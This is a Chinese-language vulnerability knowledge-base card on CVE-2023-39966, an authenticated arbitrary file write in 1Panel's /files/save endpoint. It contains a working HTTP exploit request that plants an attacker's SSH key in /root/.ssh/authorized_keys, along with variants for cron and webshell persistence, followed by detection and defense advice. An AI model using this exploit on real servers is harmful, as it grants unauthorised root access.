---
id: web-golang-1panel-files-save-arbitrary-file-write-authorized-keys
title: 1Panel /files/save 任意文件写入：path/content 全可控，写 /root/.ssh/authorized_keys 换 SSH 登录（CVE-2023-39966）
type: scenario
domain: web
path: web/golang
technique: 1panel-files-save-arbitrary-file-write
tags:
- golang
- gin
- 1panel
- arbitrary-file-write
- cve-2023-39966
- ssh
- authenticated
cve:
- CVE-2023-39966
affected_versions: 1Panel 1.4.2（原文源码分析版本；原文未给出官方受影响区间）
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V540
  verified_at: '2026-11-11T19:15:48+08:00'
  notes: 已对照 content.md 与 img03/11/12 核对：/files/save -> SaveContent，FileEdit path/content 均 validate:"required"；SaveContent 用 NewFileInfo(Expand:false) + WriteFile；图11 POST /api/v1/files/save 写 /root/.ssh/authorized_keys 返回 200，图12 cat 确认公钥写入。未验证点：未本地复现 SSH 登录。版本：1.4.2 为源码分析版本，原文未给官方受影响区间，保留卡内标注。dedup_review 与 multipart filename 写 key 卡的差异成立。
url: /docs/web/golang/web-golang-1panel-files-save-arbitrary-file-write-authorized-keys/
draft: false
kb_aliases:
- CVE-2023-39966
- 1Panel 任意文件写入
- SaveContent
- files/save
- authorized_keys 写入
- 面板写 SSH 公钥
---

## 一句话结论

1Panel 的 `POST /api/v1/files/save`（`BaseApi.SaveContent`）直接使用请求中的 `path` 与 `content`：先用 `files.NewFileInfo(Path, Expand:false)` 解析目标，再 `WriteFile(edit.Path, content, mode)` 写入；路径只要求非空、内容只要求非空，登录用户可向任意绝对路径写入任意内容，实战中写 `/root/.ssh/authorized_keys` 即可用自己的公钥免密 SSH 登录服务器。

## 原理

- 请求结构与校验：
  ```go
  type FileEdit struct {
      Path    string `json:"path"  validate:"required"`
      Content string `json:"content"  validate:"required"`
  }
  ```
  两个字段都只校验“非空”，没有路径白名单、内容类型或归属校验。
- 服务层：
  ```go
  func (f *FileService) SaveContent(edit request.FileEdit) error {
      info, err := files.NewFileInfo(files.FileOption{Path: edit.Path, Expand: false})
      fo := files.NewFileOp()
      return fo.WriteFile(edit.Path, strings.NewReader(edit.Content), info.FileMode)
  }
  ```
  `Expand: false` 表示不做 `~`/相对路径等扩展，因此写入要使用绝对路径；但绝对路径本身没有限制，`/root/.ssh/authorized_keys`、`/etc/cron.d/*`、Web 目录、面板配置等都可写。
- `WriteFile` 以 `info.FileMode`（目标文件/父目录的权限）创建或覆盖文件；若父目录存在即可写入。面板通常以 root 运行，因此可写系统敏感路径。
- 之所以成立：文件编辑是面板的合法功能，但接口把“路径”当作可信输入；缺少基目录限制时，编辑器就变成任意文件写入原语。
- 危害升级：写入 `authorized_keys` 后，攻击者用对应私钥直接 SSH 登录，绕过面板认证；也可写 cron/计划任务、WebShell、面板配置等。

## 触发条件

- 目标为存在该问题的 1Panel 版本（原文分析 1.4.2）。
- 攻击者持有面板有效会话（`/api/v1` 私有路由组，带 `pssession` Cookie）。
- 面板进程对目标路径有写权限（root 运行时几乎全部可写）。
- 目标开启 SSH 且允许公钥登录（写 authorized_keys 路线）。

## 利用步骤

1. 本地生成 SSH 密钥对：`ssh-keygen -t rsa -b 4096`，得到 `~/.ssh/id_rsa` 与 `id_rsa.pub`。
2. 登录面板，向 `/api/v1/files/save` 发送 JSON，`path` 指向 `/root/.ssh/authorized_keys`，`content` 为公钥内容（保留 `ssh-rsa AAAA...` 格式）。
3. 接口返回 `{"code":200,...}` 即写入成功（新文件或覆盖）。
4. 用私钥 SSH 登录：`ssh -i ~/.ssh/id_rsa root@target`，验证免密登录。
5. 授权测试中仅写自己的公钥并在结束后清理；也可写无害文件验证写入能力。

## PoC

```http
POST /api/v1/files/save HTTP/1.1
Host: target:port
Content-Type: application/json
Cookie: pssession=<有效会话>

{
  "content": "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ...== root@attacker",
  "path": "/root/.ssh/authorized_keys"
}
```

响应：

```json
{"code":200,"message":"","data":{}}
```

服务器侧验证：

```bash
cat /root/.ssh/authorized_keys
# ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQ...== root@attacker
```

随后 `ssh -i id_rsa root@target` 登录成功。

## 变体与关联

- 变体：写入 `/etc/cron.d/`、`/var/spool/cron/`、systemd 单元、面板配置或 Web 目录均可获得执行/持久化；若目标不允许 root 登录，可写对应用户的 `~/.ssh/authorized_keys`。
- 关联：[[web-golang-1panel-files-path-arbitrary-read-download]]（同 files 路由组的任意文件读取，可先读配置再写）；[[web-golang-1panel-firewall-ip-command-injection-cve-2023-37477]]（同面板命令注入，可直接拿 shell）。
- 边界：面板以非 root 且目标路径不可写、接口增加基目录/后缀校验或只允许编辑已有业务文件时，写入路线受限。

## 检测与防御

- 检测：`/files/save` 写入 `.ssh/authorized_keys`、`/etc/`、计划任务目录等敏感路径；`path` 为绝对路径且不属于站点/应用目录；写入内容包含 `ssh-rsa`/`ssh-ed25519`；面板用户异常 SSH 登录。
- 防御：文件操作限制在白名单基目录内（`filepath.Clean` + 前缀校验），禁止编辑系统/密钥/配置目录；按文件 ID 而非客户端路径操作；面板以最小权限运行；监控 authorized_keys 与计划任务变更。
